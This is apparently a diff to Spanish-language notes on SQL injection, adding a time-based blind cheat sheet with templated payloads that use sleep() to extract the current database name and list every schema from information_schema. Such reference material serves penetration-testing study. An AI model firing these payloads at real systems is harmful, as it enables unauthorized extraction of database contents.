@@ -120,6 +120,15 @@ Se utiliza cuando la web es estática y no cambia en nada (se dice tambien que e
 ?id=1' AND IF(ascii(substr(database(),1,1))=104, sleep(3), 1)-- -
 ```
 
+#### Cheatsheet Time based blind
+##### Enumerar BD actual
+```sql
+admin' and if(substr(database(),{pos},1)='{caracter}',sleep(5),1)
+```
+##### Enumerar las BD existentes
+```sql
+admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),{pos},1)='{caracter}',sleep(0.9),1)-- -
+```
 
 ### Identificar la Base de Datos Actual
 
